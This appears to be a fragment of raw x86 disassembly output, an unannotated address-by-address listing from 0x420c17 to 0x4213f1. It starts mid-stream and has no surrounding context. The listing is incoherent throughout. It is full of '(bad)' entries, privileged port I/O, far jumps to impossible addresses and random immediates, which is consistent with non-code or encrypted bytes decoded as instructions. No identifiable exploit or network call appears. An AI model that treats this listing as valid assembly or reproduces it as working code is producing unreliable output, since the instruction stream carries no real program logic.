  420c17:	sbb    DWORD PTR [edi+eax*8-0x6b],ebp
  420c1b:	retf   0x922f
  420c1e:	loop   0x420c97
  420c20:	div    BYTE PTR [edi-0x5a]
  420c23:	(bad)  
  420c24:	enter  0x9fa3,0xde
  420c28:	sbb    esp,DWORD PTR [esp+esi*1]
  420c2b:	xchg   BYTE PTR [edx-0x340aa08c],dh
  420c31:	ret    
  420c32:	pop    ds
  420c33:	sbb    eax,esi
  420c35:	add    bl,BYTE PTR [edx]
  420c37:	push   esi
  420c38:	cmc    
  420c39:	dec    ecx
  420c3a:	mov    DWORD PTR ds:0x2b21872c,esp
  420c40:	neg    ecx
  420c42:	popf   
  420c43:	es jle 0x420c16
  420c46:	je     0x420c40
  420c48:	lds    ebx,FWORD PTR [ebx]
  420c4a:	pop    ss
  420c4b:	(bad)  
  420c4c:	jmp    0xc59d03cd
  420c51:	xchg   ecx,eax
  420c52:	and    DWORD PTR [edi+0x2f],eax
  420c55:	retf   0x4677
  420c58:	test   al,0xd3
  420c5a:	inc    ebp
  420c5b:	fwait
  420c5c:	int    0x68
  420c5e:	jecxz  0x420cd8
  420c60:	imul   esp,esp,0x79
  420c63:	das    
  420c64:	popf   
  420c65:	sub    BYTE PTR fs:[ebx-0x22aab7f7],ah
  420c6c:	(bad)
  420c6f:	cli    
  420c70:	mov    dl,0x20
  420c72:	outs   dx,DWORD PTR ds:[esi]
  420c73:	cmp    esp,DWORD PTR [edi]
  420c75:	call   0x33f2b993
  420c7a:	int    0x39
  420c7c:	enter  0x6709,0x36
  420c80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420c81:	add    al,0x6f
  420c83:	shr    DWORD PTR [edi],cl
  420c85:	pop    eax
  420c86:	adc    eax,0x9839523a
  420c8b:	jbe    0x420c81
  420c8d:	mov    eax,ds:0xd0ec88a4
  420c92:	lock les ebx,FWORD PTR [edi+0x5f]
  420c96:	imul   eax,DWORD PTR [eax],0xa0db3303
  420c9c:	pop    ebx
  420c9d:	shl    BYTE PTR [eax+0x3733ffe4],0xb0
  420ca4:	xchg   edx,eax
  420ca5:	dec    esi
  420ca6:	and    DWORD PTR [eax],esp
  420ca8:	xor    bl,BYTE PTR [esi]
  420caa:	dec    ebx
  420cab:	push   cs
  420cac:	je     0x420c4a
  420cae:	push   ecx
  420caf:	jb     0x420d2c
  420cb1:	ins    BYTE PTR es:[edi],dx
  420cb2:	test   ebx,0x4f6dd5b1
  420cb8:	cli    
  420cb9:	mov    al,0x91
  420cbb:	mov    ds:0xbaf480f4,al
  420cc0:	out    0xef,eax
  420cc2:	in     eax,dx
  420cc3:	push   cs
  420cc4:	inc    ecx
  420cc5:	imul   esp,DWORD PTR [edx-0x6fcae7d2],0x71
  420ccc:	(bad)  
  420cce:	cmp    BYTE PTR [eax-0x54],cl
  420cd1:	push   edi
  420cd2:	or     DWORD PTR [edx-0xb1f7032],ebx
  420cd8:	dec    esp
  420cd9:	inc    ebx
  420cda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420cdb:	jns    0x420cbc
  420cdd:	fldl2t 
  420cdf:	repz push eax
  420ce1:	mov    eax,0xbc0e05f3
  420ce6:	shl    DWORD PTR [ebx+ebx*4+0x2266232e],0x91
  420cee:	add    al,0x85
  420cf0:	in     al,dx
  420cf1:	xchg   esi,eax
  420cf2:	arpl   WORD PTR [edi],di
  420cf4:	or     DWORD PTR [eax],edi
  420cf6:	out    0x44,eax
  420cf8:	imul   eax,DWORD PTR [eax-0x336236fb],0x9bb404f3
  420d02:	push   esi
  420d03:	push   cs
  420d04:	dec    ebx
  420d05:	gs pop ebx
  420d07:	data16 add al,0xf4
  420d0a:	enter  0x47d8,0x73
  420d0e:	mov    eax,0xf545e2ff
  420d13:	push   edx
  420d14:	das    
  420d15:	mov    ss,WORD PTR [eax-0x20]
  420d18:	js     0x420d67
  420d1a:	sub    al,0x98
  420d1c:	sub    ecx,DWORD PTR [edi]
  420d1e:	test   BYTE PTR [edi+eiz*1-0x2980c88b],dl
  420d25:	dec    esi
  420d26:	jge    0x420d29
  420d28:	jp     0x420d77
  420d2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d2b:	jae    0x420d30
  420d2d:	pop    eax
  420d2e:	sub    dh,dl
  420d30:	adc    al,al
  420d32:	rcl    ebx,0xe1
  420d35:	and    al,0x41
  420d37:	test   al,0xe7
  420d39:	inc    esp
  420d3a:	xchg   esp,eax
  420d3b:	inc    edx
  420d3c:	outs   dx,BYTE PTR ds:[esi]
  420d3d:	test   BYTE PTR [ebx-0x6f41f1ad],0x78
  420d44:	scas   eax,DWORD PTR es:[edi]
  420d45:	adc    eax,0x717ca0d8
  420d4a:	jmp    0xcf31:0xf053f048
  420d51:	and    eax,0x536c9807
  420d56:	xchg   ecx,eax
  420d57:	outs   dx,DWORD PTR ds:[esi]
  420d58:	mov    BYTE PTR [eax],bh
  420d5a:	fistp  DWORD PTR [eax-0x3e]
  420d5d:	pop    ds
  420d5e:	shl    DWORD PTR ds:0x7abf3be3,1
  420d64:	or     ah,ah
  420d66:	sbb    esp,DWORD PTR [eax+ebp*4+0x6fffac63]
  420d6d:	mov    eax,ds:0x5d9fbe83
  420d72:	sahf   
  420d73:	xor    ebx,ebx
  420d75:	div    DWORD PTR [edi+0x3a05e01]
  420d7b:	mov    cl,0x66
  420d7d:	cmp    bl,bl
  420d7f:	mov    ecx,0x283b98fe
  420d84:	push   ebp
  420d85:	adc    al,0x63
  420d87:	stos   DWORD PTR es:[edi],eax
  420d88:	stos   DWORD PTR es:[edi],eax
  420d89:	add    eax,0xfffb8984
  420d8e:	inc    eax
  420d8f:	xchg   BYTE PTR [edi+0x688d8d98],ch
  420d95:	push   eax
  420d96:	nop
  420d97:	xchg   esi,eax
  420d98:	pop    edx
  420d99:	pop    ebx
  420d9a:	inc    edx
  420d9b:	xchg   esi,eax
  420d9c:	sbb    al,0xb5
  420d9e:	inc    esi
  420d9f:	pushf  
  420da0:	jp     0x420d4c
  420da2:	fnstsw WORD PTR [edx-0x1e]
  420da5:	cmp    al,0x6a
  420da7:	inc    ebx
  420da8:	ret    0xd04d
  420dab:	push   esi
  420dac:	push   es
  420dad:	sub    bl,BYTE PTR [esi+0x267665ea]
  420db3:	jmp    0x420d6a
  420db5:	jl     0x420dc8
  420db7:	xchg   edx,eax
  420db8:	cdq    
  420db9:	arpl   WORD PTR ss:[esi],dx
  420dbc:	jns    0x420e0d
  420dbe:	repz int 0x48
  420dc1:	mov    ecx,0x1b39aa97
  420dc6:	and    al,0xf7
  420dc8:	imul   edi,DWORD PTR [ecx-0x703db7ba],0xffffffc1
  420dcf:	addr16 pop ebp
  420dd1:	cmp    al,0xc4
  420dd3:	xchg   BYTE PTR [edi-0x3c1d1cd4],dl
  420dd9:	push   edi
  420dda:	jmp    0x420dd1
  420ddc:	xchg   DWORD PTR [edx+edx*8+0x46],edi
  420de0:	push   ebx
  420de1:	dec    edx
  420de2:	inc    edi
  420de3:	fs gs xchg dl,dl
  420de7:	pop    esp
  420de8:	jno    0x420e1a
  420dea:	test   al,0x22
  420dec:	test   DWORD PTR [edx+ebp*2+0x732d4763],ebx
  420df3:	int3   
  420df4:	ins    DWORD PTR es:[edi],dx
  420df5:	ins    DWORD PTR es:[edi],dx
  420df6:	jno    0x420e64
  420df8:	dec    esp
  420df9:	fxch   st(3)
  420dfb:	and    ebx,edi
  420dfd:	test   DWORD PTR [ebx+0x5851fc38],esp
  420e03:	jmp    0x808a:0xbf4029db
  420e0a:	xlat   BYTE PTR ds:[ebx]
  420e0b:	popf   
  420e0c:	jmp    0xa1517704
  420e11:	icebp  
  420e12:	loope  0x420dea
  420e14:	icebp  
  420e15:	imul   edi,DWORD PTR [ebp+0x78],0x15
  420e19:	fsubr  st,st(4)
  420e1b:	mov    DWORD PTR [ebx+0x77542f1d],esp
  420e21:	pop    es
  420e22:	jl     0x420e61
  420e24:	call   0x6887aebc
  420e29:	es out dx,eax
  420e2b:	repz test al,0xe0
  420e2e:	pavgb  mm2,mm0
  420e31:	push   cs
  420e32:	push   0xe31bc9ca
  420e37:	or     al,0x77
  420e39:	imul   esi,DWORD PTR [eax-0x4f],0x5fd785ea
  420e40:	push   esi
  420e41:	cmp    edx,ebp
  420e43:	cs pop esp
  420e45:	sbb    esi,edi
  420e47:	fs mov ah,0x45
  420e4a:	gs leave 
  420e4c:	jecxz  0x420e2a
  420e4e:	(bad)  
  420e50:	adc    cl,al
  420e52:	add    DWORD PTR [ebx],edx
  420e54:	test   eax,0x6263e2cf
  420e59:	in     eax,dx
  420e5a:	jne    0x420e4e
  420e5c:	cdq    
  420e5d:	out    dx,al
  420e5e:	popf   
  420e5f:	sbb    eax,0x9cc7f444
  420e64:	ret    0x8672
  420e67:	bswap  ebp
  420e69:	lahf   
  420e6a:	(bad)  
  420e6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420e6c:	adc    BYTE PTR [esp+ebx*8-0x433a427a],0x63
  420e74:	and    esp,DWORD PTR [edi]
  420e76:	sbb    eax,0xdb564bac
  420e7b:	(bad)  
  420e7c:	dec    edx
  420e7d:	pusha  
  420e7e:	leave  
  420e7f:	jle    0x420ee2
  420e81:	or     dl,BYTE PTR [esi+ebx*8]
  420e84:	cwde   
  420e85:	div    DWORD PTR [edx]
  420e87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e88:	mov    WORD PTR [ebx+0x17],fs
  420e8b:	call   0xa40e027b
  420e90:	ja     0x420e62
  420e92:	and    edx,DWORD PTR [ebp+0x1893c2e7]
  420e98:	ds inc ebp
  420e9a:	pusha  
  420e9b:	out    0xe4,al
  420e9d:	mov    cl,0x3a
  420e9f:	xchg   ebp,eax
  420ea0:	into   
  420ea1:	sub    BYTE PTR [ebx],0xa7
  420ea4:	adc    DWORD PTR [ebx],ebp
  420ea6:	imul   DWORD PTR [edi-0x6f8bc401]
  420eac:	mov    eax,0x5cb604c4
  420eb1:	jecxz  0x420f29
  420eb3:	add    DWORD PTR [ebx-0x7f1ac649],esp
  420eb9:	jno    0x420ed9
  420ebb:	push   ebx
  420ebc:	mov    ds:0x482773a4,eax
  420ec1:	imul   ebp,DWORD PTR [esi],0xfffffffb
  420ec4:	stos   BYTE PTR es:[edi],al
  420ec5:	int3   
  420ec6:	push   DWORD PTR [edi+0x7f1b0201]
  420ecc:	out    0xcc,al
  420ece:	bound  esp,QWORD PTR [eax+0x1970b79]
  420ed4:	pop    edx
  420ed5:	mov    bh,0x8
  420ed7:	jae    0x420f36
  420ed9:	or     bl,BYTE PTR [eax+0x70]
  420edc:	sub    al,0x7f
  420ede:	test   BYTE PTR [edi-0xb],dl
  420ee1:	hlt    
  420ee2:	dec    ecx
  420ee3:	inc    edx
  420ee4:	adc    eax,0x5679c5a1
  420ee9:	or     esp,ebx
  420eeb:	pop    edx
  420eec:	pop    eax
  420eed:	cmp    al,BYTE PTR [edx-0x16974098]
  420ef3:	jne    0x420f50
  420ef5:	cmp    ebp,DWORD PTR [edx+ebx*2]
  420ef8:	in     eax,0xe2
  420efa:	sub    edi,ebx
  420efc:	dec    edx
  420efd:	sti    
  420efe:	jge    0x420e89
  420f00:	push   ebp
  420f01:	jns    0x420f71
  420f03:	sub    eax,DWORD PTR [esi+0x3b8a6868]
  420f09:	lock lock and al,0x9e
  420f0d:	(bad)  
  420f0e:	jl     0x420ecf
  420f10:	aam    0x17
  420f12:	and    dl,BYTE PTR [ebx]
  420f14:	scas   eax,DWORD PTR es:[edi]
  420f15:	frstor [esp+edi*1]
  420f18:	int    0xee
  420f1a:	cmp    dl,BYTE PTR [ecx+0x2f]
  420f1d:	fstp   QWORD PTR [ebx+0x318751f3]
  420f23:	test   al,0xfa
  420f25:	adc    al,0x27
  420f27:	sub    al,0x60
  420f29:	(bad)  
  420f2a:	popf   
  420f2b:	stos   DWORD PTR es:[edi],eax
  420f2c:	push   edx
  420f2d:	inc    esi
  420f2e:	mov    ebp,0xceab1a5e
  420f33:	cmp    esi,DWORD PTR [ebp+0x37d7e6d7]
  420f39:	fwait
  420f3a:	pop    edi
  420f3b:	std    
  420f3c:	fadd   DWORD PTR [ecx-0x25]
  420f3f:	xor    eax,0x97047231
  420f44:	mov    ebx,0x16a31283
  420f49:	aam    0xf7
  420f4b:	imul   eax,DWORD PTR [ecx-0x947a621],0xebd97765
  420f55:	add    al,0x7e
  420f57:	mov    fs,WORD PTR [eax+0x307d9efa]
  420f5d:	fmul   QWORD PTR [edi]
  420f5f:	fsubr  DWORD PTR [eax-0xb]
  420f62:	mov    cl,0x15
  420f64:	inc    esi
  420f65:	mov    fs,WORD PTR [ecx+0xb]
  420f68:	or     eax,0xb7375fd4
  420f6d:	sbb    al,0x16
  420f6f:	in     eax,0x9e
  420f71:	mov    BYTE PTR [ecx+0x7c],bh
  420f74:	xor    DWORD PTR [esi-0x4a],ebx
  420f77:	ja     0x420f5d
  420f79:	mov    BYTE PTR [ebx-0x78],ch
  420f7c:	scas   eax,DWORD PTR es:[edi]
  420f7d:	sar    DWORD PTR [ecx],cl
  420f7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420f80:	sti    
  420f81:	stos   BYTE PTR es:[edi],al
  420f82:	jae    0x420f8c
  420f84:	jmp    0x420fdd
  420f86:	jecxz  0x420f6e
  420f88:	add    BYTE PTR [edi-0x27],dl
  420f8b:	push   ds
  420f8c:	div    BYTE PTR [ebp+ecx*4-0x6112d541]
  420f93:	int    0x8b
  420f95:	in     al,dx
  420f96:	add    DWORD PTR [edx+0x292b4706],0x91c25a14
  420fa0:	cmp    bh,bh
  420fa2:	retf   0xd40
  420fa5:	and    esi,DWORD PTR [edi-0x6b8ef83c]
  420fab:	lock fs or al,al
  420faf:	cdq    
  420fb0:	xlat   BYTE PTR ds:[ebx]
  420fb1:	push   edi
  420fb2:	dec    ebp
  420fb3:	pushf  
  420fb4:	retf   
  420fb5:	shr    BYTE PTR [ecx-0x613d22bd],1
  420fbb:	fwait
  420fbc:	mul    DWORD PTR [eax-0x43]
  420fbf:	(bad)  
  420fc0:	push   ebp
  420fc1:	push   ds
  420fc2:	in     eax,0xa3
  420fc4:	push   0xc298c6e5
  420fc9:	sub    eax,0x9980c39f
  420fce:	leave  
  420fcf:	jge    0x421045
  420fd1:	or     al,0x90
  420fd3:	(bad)  
  420fd4:	lock mov bh,0x81
  420fd7:	scas   al,BYTE PTR es:[edi]
  420fd8:	cmp    eax,0x3837b937
  420fdd:	jae    0x420fe4
  420fdf:	int3   
  420fe0:	cmc    
  420fe1:	das    
  420fe2:	inc    ecx
  420fe3:	idiv   BYTE PTR [esi+0x5eafa654]
  420fe9:	inc    esp
  420fea:	jae    0x420fd0
  420fec:	or     BYTE PTR [esi+0x17e6c7da],dh
  420ff2:	inc    ebp
  420ff3:	push   es
  420ff4:	and    eax,0x7d3b6e44
  420ff9:	stos   BYTE PTR es:[edi],al
  420ffa:	test   cl,ch
  420ffc:	outs   dx,DWORD PTR ds:[esi]
  420ffd:	add    esi,DWORD PTR [edx+0x1af3122]
  421003:	ins    DWORD PTR es:[di],dx
  421005:	imul   eax,DWORD PTR [edx-0x1357c2f3],0xdb749b43
  42100f:	dec    edi
  421010:	jbe    0x421009
  421012:	push   edi
  421013:	ss push ebx
  421015:	xor    ecx,DWORD PTR ds:0xdefc787e
  42101b:	ss jns 0x42107f
  42101e:	xor    DWORD PTR [esp+ecx*2],ecx
  421021:	dec    esi
  421022:	push   ecx
  421023:	pushf  
  421024:	pop    edi
  421025:	or     al,BYTE PTR [ecx-0x7bf7e0a0]
  42102b:	(bad)
  42102e:	ins    BYTE PTR es:[edi],dx
  42102f:	clc    
  421030:	sahf   
  421031:	push   0xb5485d11
  421036:	jns    0x420fe6
  421038:	sbb    dh,BYTE PTR [edi]
  42103a:	scas   eax,DWORD PTR es:[edi]
  42103b:	pop    ebp
  42103c:	add    BYTE PTR ds:0x27bf4be0,ah
  421042:	(bad)  
  421043:	retf   0x128a
  421046:	in     al,0x74
  421048:	repnz stc 
  42104a:	int3   
  42104b:	shr    DWORD PTR [esi*1-0x236102ca],1
  421052:	es jae 0x42106b
  421055:	outs   dx,BYTE PTR ds:[esi]
  421056:	ins    DWORD PTR es:[edi],dx
  421057:	sub    eax,0xd34c836b
  42105c:	or     BYTE PTR [ebx],0xbb
  42105f:	xor    eax,0xf99b865
  421064:	xchg   BYTE PTR [ebp+edx*4-0x4c],dh
  421068:	add    ebx,DWORD PTR [ecx]
  42106a:	les    esi,FWORD PTR [ebp+0x7f]
  42106d:	inc    edx
  42106e:	leave  
  42106f:	scas   al,BYTE PTR es:[edi]
  421070:	inc    edx
  421071:	fcom   QWORD PTR [edx+0x39c04713]
  421077:	pop    ds
  421078:	pop    eax
  421079:	cmp    BYTE PTR [ebx+edi*2-0x13],dh
  42107d:	jb     0x4210ea
  42107f:	jae    0x4210fc
  421081:	test   al,0x24
  421083:	add    DWORD PTR [ebx+0x72],esp
  421086:	jnp    0x4210dc
  421088:	ins    DWORD PTR es:[di],dx
  42108a:	xchg   edi,eax
  42108b:	mov    ch,0xa4
  42108d:	mov    ah,0xa6
  42108f:	push   ebx
  421090:	push   esi
  421091:	pop    eax
  421092:	mov    BYTE PTR [ebx-0x44],0x42
  421096:	(bad)  
  421097:	pop    ebx
  421098:	push   edi
  421099:	xchg   ecx,eax
  42109a:	sub    al,0x80
  42109c:	popa   
  42109d:	fstp   DWORD PTR [ebp-0x53]
  4210a0:	stos   DWORD PTR es:[edi],eax
  4210a1:	cmp    al,0x21
  4210a3:	out    0xa0,eax
  4210a5:	loop   0x42110d
  4210a7:	mov    dl,0x95
  4210a9:	in     eax,dx
  4210aa:	loop   0x4210d1
  4210ac:	adc    BYTE PTR [edi-0x729ebdf9],bh
  4210b2:	pop    esp
  4210b3:	xchg   ebx,eax
  4210b4:	mov    dl,BYTE PTR [edi-0x2]
  4210b7:	iret   
  4210b8:	(bad)  
  4210ba:	or     edx,DWORD PTR [ebx-0x5a2c149e]
  4210c0:	test   al,0xdf
  4210c2:	xor    eax,0x78789a8d
  4210c7:	jo     0x4210a0
  4210c9:	pop    ss
  4210ca:	loop   0x4210f4
  4210cc:	je     0x4210e6
  4210ce:	popa   
  4210cf:	and    BYTE PTR [edi],bh
  4210d1:	inc    ecx
  4210d2:	je     0x421059
  4210d4:	test   DWORD PTR [esi],edx
  4210d6:	lods   al,BYTE PTR ds:[esi]
  4210d7:	xor    DWORD PTR [edx-0x2fd9f194],eax
  4210dd:	rol    BYTE PTR [ecx+edx*8+0x6450b667],cl
  4210e4:	into   
  4210e5:	dec    ebx
  4210e6:	xlat   BYTE PTR ds:[ebx]
  4210e7:	lock xchg BYTE PTR [ecx],dl
  4210ea:	inc    esp
  4210eb:	daa    
  4210ec:	mov    bh,0x55
  4210ee:	push   0xb81ae55e
  4210f3:	mov    dl,BYTE PTR [ebx+0x1c]
  4210f6:	sbb    eax,0x4d82fe90
  4210fb:	ds or  ebp,ecx
  4210fe:	push   ss
  4210ff:	in     al,0x2a
  421101:	mov    BYTE PTR [ebx],dl
  421103:	sub    bh,BYTE PTR [edx+0x5088cb22]
  421109:	adc    dx,WORD PTR [ecx]
  42110c:	xchg   ecx,eax
  42110d:	xlat   BYTE PTR ds:[ebx]
  42110e:	gs mov dh,0x32
  421111:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421112:	mov    ebp,0xbbfff66a
  421117:	xchg   esi,eax
  421118:	mov    eax,0x1ea258b4
  42111d:	shl    dh,0x6
  421120:	xor    ch,dl
  421122:	cli    
  421123:	mov    eax,ds:0x236b8cbb
  421128:	cmp    eax,esi
  42112a:	cmc    
  42112b:	mov    bh,0x21
  42112d:	outs   dx,BYTE PTR ds:[esi]
  42112e:	cmp    BYTE PTR [esi-0x3],ah
  421131:	add    dh,BYTE PTR [edx-0x2]
  421134:	pop    esp
  421135:	add    edi,DWORD PTR [ebx+0x641b6577]
  42113b:	ins    BYTE PTR es:[edi],dx
  42113c:	pop    esi
  42113d:	xchg   esp,eax
  42113e:	jl     0x421164
  421140:	(bad)  
  421141:	loopne 0x421123
  421143:	test   BYTE PTR [ecx-0xa],cl
  421146:	jp     0x42119f
  421148:	repnz imul esi,DWORD PTR [eax],0xeee7dde0
  42114f:	or     eax,0x979d56a4
  421154:	dec    ebx
  421155:	xchg   DWORD PTR ds:0x787529b0,ebx
  42115b:	xor    edi,DWORD PTR [ecx-0x72ee7627]
  421161:	xchg   ebp,eax
  421162:	jp     0x4211b0
  421164:	push   ecx
  421165:	iret   
  421166:	mov    ecx,0xdc39d208
  42116b:	add    BYTE PTR [esi+0x97a8026],ah
  421171:	or     al,0x69
  421173:	xor    eax,0xd428d86b
  421178:	push   esp
  421179:	sbb    al,0xaf
  42117b:	xor    eax,0x6cb60204
  421180:	push   ecx
  421181:	pop    esi
  421182:	dec    ebp
  421183:	pop    ebx
  421184:	fild   QWORD PTR [eax+0x43]
  421187:	ss push esp
  421189:	ror    DWORD PTR [eax],0xc
  42118c:	test   eax,0x68c67ea5
  421191:	into   
  421192:	cwde   
  421193:	pop    esi
  421194:	sbb    BYTE PTR [ebx],0x49
  421197:	and    DWORD PTR ds:0x9fe565a5,ebx
  42119d:	pop    ebx
  42119e:	ret    
  42119f:	jo     0x421151
  4211a1:	das    
  4211a2:	aas    
  4211a3:	imul   edi,DWORD PTR [edx+eiz*8-0x49f2befc],0x19
  4211ab:	dec    ebx
  4211ac:	sti    
  4211ad:	jle    0x4211d3
  4211af:	jg     0x42114b
  4211b1:	mov    al,0x11
  4211b3:	frstor [ebp+0x301efce4]
  4211b9:	mov    ebx,0x84164a3e
  4211be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4211bf:	jle    0x4211b7
  4211c1:	(bad)  
  4211c2:	js     0x4211d4
  4211c4:	pop    es
  4211c5:	mov    bh,0x31
  4211c7:	out    0x69,eax
  4211c9:	mov    edi,0x35e4b11e
  4211ce:	icebp  
  4211cf:	mov    edx,0xbb45e22a
  4211d4:	cld    
  4211d5:	stos   DWORD PTR es:[edi],eax
  4211d6:	lahf   
  4211d7:	shl    DWORD PTR [eax],1
  4211d9:	sti    
  4211da:	ins    DWORD PTR es:[edi],dx
  4211db:	retf   
  4211dc:	jbe    0x4211f9
  4211de:	or     eax,0x6d09be01
  4211e3:	add    DWORD PTR [ebx+0x2abbe963],ecx
  4211e9:	(bad)  [edx+eiz*1+0x62ebdc6f]
  4211f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4211f1:	mov    ds:0xdef7ddba,al
  4211f6:	test   BYTE PTR [eax-0x269ad52c],0x1c
  4211fd:	jns    0x421195
  4211ff:	lock cmp eax,0xbc02e0fa
  421205:	and    esi,ecx
  421207:	xlat   BYTE PTR ds:[ebx]
  421208:	pop    esi
  421209:	add    cl,bh
  42120b:	frstor [ebp+0x25912fe8]
  421211:	rol    DWORD PTR [eax],cl
  421213:	lods   al,BYTE PTR ds:[esi]
  421214:	xor    al,0xf9
  421216:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421217:	je     0x42120f
  421219:	hlt    
  42121a:	push   ebp
  42121b:	(bad)  
  42121c:	scas   eax,DWORD PTR es:[edi]
  42121d:	mov    ebp,0xe9d755c2
  421222:	lock mov WORD PTR [eax],es
  421225:	jg     0x4211c0
  421227:	add    eax,0x2f
  42122a:	xchg   edx,eax
  42122b:	loopne 0x421266
  42122d:	lods   eax,DWORD PTR ds:[esi]
  42122e:	xor    eax,0x87431b5c
  421233:	repz push ss
  421235:	ins    BYTE PTR es:[edi],dx
  421236:	or     al,0x71
  421238:	mov    ebx,0xf6883b20
  42123d:	data16 daa 
  42123f:	cli    
  421240:	mov    eax,ds:0x4e789206
  421245:	clc    
  421246:	mov    esi,0x2f8e3459
  42124b:	jo     0x421226
  42124d:	shr    DWORD PTR [ebx-0x73],cl
  421250:	xor    eax,0xd1186dac
  421255:	retf   
  421256:	mov    cl,0xd0
  421258:	and    eax,0xd1c1bf
  42125d:	inc    esp
  42125e:	out    dx,eax
  42125f:	push   edi
  421260:	out    0x37,eax
  421262:	pop    edi
  421263:	cli    
  421264:	and    bh,BYTE PTR [edi-0x1]
  421267:	ss jnp 0x4211eb
  42126a:	dec    ecx
  42126b:	mov    ebp,0x28be0af7
  421270:	fistp  WORD PTR [ebx+0x78]
  421273:	ror    ecx,0xbb
  421276:	push   cs
  421277:	sub    cl,bl
  421279:	stc    
  42127a:	mov    esi,0xdcdb5538
  42127f:	cwde   
  421280:	sbb    BYTE PTR [ebp+0x25],ah
  421283:	mov    esi,0xae675ee
  421288:	xchg   ebp,eax
  421289:	fwait
  42128a:	fwait
  42128b:	mov    ds:0x58d418cd,al
  421290:	scas   eax,DWORD PTR es:[edi]
  421291:	test   eax,0xaa5a953b
  421296:	jae    0x4212df
  421298:	sbb    al,0x11
  42129a:	into   
  42129b:	pop    es
  42129c:	mov    bh,0xb6
  42129e:	rcl    DWORD PTR ds:0x28c85ca1,cl
  4212a4:	sub    cl,BYTE PTR [edx+0x183b7b75]
  4212aa:	fisubr DWORD PTR [esi-0x62f9e6f0]
  4212b0:	cmp    DWORD PTR [eax+0x6113b4a0],ecx
  4212b6:	inc    edi
  4212b7:	retf   0x5e51
  4212ba:	inc    esi
  4212bb:	call   0x162c9614
  4212c0:	sbb    DWORD PTR [ebp+0x43],0x14
  4212c4:	add    eax,0x6489294
  4212c9:	ret    0x9ae6
  4212cc:	es adc al,0xf6
  4212cf:	dec    ebp
  4212d0:	push   ecx
  4212d1:	pop    ss
  4212d2:	shl    DWORD PTR [eax],1
  4212d4:	xchg   edi,eax
  4212d5:	push   esi
  4212d6:	call   0xae11:0x54ce8417
  4212dd:	and    eax,0x90225fa4
  4212e2:	fwait
  4212e3:	mov    ebp,0xa926150b
  4212e8:	test   BYTE PTR [eax+0x38],0x19
  4212ec:	cdq    
  4212ed:	add    eax,0xffdb4b20
  4212f2:	rol    BYTE PTR [eax-0x40],1
  4212f5:	test   BYTE PTR [esi+0x2b],ch
  4212f8:	pop    ss
  4212f9:	sar    ebp,0x34
  4212fc:	or     eax,0x6c1a883e
  421301:	add    eax,0xac72760c
  421306:	fist   WORD PTR [edx]
  421308:	nop
  421309:	es out dx,al
  42130b:	inc    eax
  42130c:	or     edi,DWORD PTR [esi+0x7df9da32]
  421312:	jns    0x421369
  421314:	pop    edi
  421315:	mov    bl,0x74
  421317:	cdq    
  421318:	mov    cl,0x23
  42131a:	movups xmm6,xmm7
  42131d:	xor    BYTE PTR gs:[edi+0x4d],dh
  421321:	addr16 mov al,0x18
  421324:	sti    
  421325:	mov    edi,DWORD PTR [eax-0x44]
  421328:	dec    esi
  421329:	(bad)  [esi]
  42132b:	jmp    FWORD PTR [ebp-0x27]
  42132e:	adc    eax,0x44ba06b
  421333:	scas   al,BYTE PTR es:[edi]
  421334:	aam    0x5e
  421336:	loop   0x4212ca
  421338:	lock sub dh,BYTE PTR ds:0xd272d2c9
  42133f:	xor    BYTE PTR [esp+ebx*8-0x393699ff],0x5f
  421347:	xor    al,0x63
  421349:	sbb    al,0xe1
  42134b:	mov    edx,0x763c451a
  421350:	cs adc al,0x2
  421353:	jle    0x421397
  421355:	dec    ecx
  421356:	dec    edi
  421357:	test   BYTE PTR [edi+0x54],ah
  42135a:	mov    al,0x25
  42135c:	pushf  
  42135d:	jne    0x421310
  42135f:	mov    edx,0xb6b1191c
  421364:	xor    DWORD PTR [ebx+0x5bf614cd],ebx
  42136a:	mov    bl,0x99
  42136c:	inc    edi
  42136d:	mov    edi,0xd0ec9dee
  421372:	fwait
  421373:	test   eax,0xc9f52e3c
  421378:	data16 jno 0x421384
  42137b:	ja     0x421376
  42137d:	cmp    ecx,esi
  42137f:	cmp    BYTE PTR [esi-0x7a2e11a],bh
  421385:	scas   al,BYTE PTR es:[edi]
  421386:	adc    edx,edi
  421388:	inc    edx
  421389:	mov    cl,0x43
  42138b:	ins    DWORD PTR es:[edi],dx
  42138c:	mov    cx,0x3825
  421390:	sub    DWORD PTR [edx+0x38ec385c],ecx
  421396:	test   DWORD PTR [ecx],esi
  421398:	out    0x25,al
  42139a:	and    ecx,ecx
  42139c:	shl    DWORD PTR [ecx-0x27],cl
  42139f:	jmp    0x13100354
  4213a4:	or     dl,BYTE PTR [edx]
  4213a6:	test   DWORD PTR [edi-0x3e],esi
  4213a9:	adc    edx,eax
  4213ab:	out    0x5,al
  4213ad:	ret    
  4213ae:	push   eax
  4213af:	cdq    
  4213b0:	push   0x4b99a7f2
  4213b5:	add    ebp,DWORD PTR ds:0xdb0af9fa
  4213bb:	int    0xc0
  4213bd:	lods   al,BYTE PTR ds:[esi]
  4213be:	dec    eax
  4213bf:	xchg   BYTE PTR [edi+0x17276d8b],ah
  4213c5:	xchg   esp,eax
  4213c6:	pusha  
  4213c7:	dec    ebp
  4213c8:	mov    ds:0xc3a5d83,al
  4213cd:	cwde   
  4213ce:	dec    edi
  4213cf:	(bad)  
  4213d0:	fdiv   QWORD PTR [ebx]
  4213d2:	shl    cl,cl
  4213d4:	sti    
  4213d5:	dec    eax
  4213d6:	ja     0x4213ae
  4213d8:	(bad)  
  4213d9:	dec    BYTE PTR [eax-0x533da595]
  4213df:	mov    DWORD PTR [esi],ebx
  4213e1:	in     eax,0x83
  4213e3:	stc    
  4213e4:	cmc    
  4213e5:	push   cs
  4213e6:	pop    esp
  4213e7:	jno    0x421448
  4213e9:	mov    al,0xc5
  4213eb:	or     ebx,ebx
  4213ed:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4213ef:	sbb    al,BYTE PTR [edx]
  4213f1:	mov    edi,0xda5d53b6
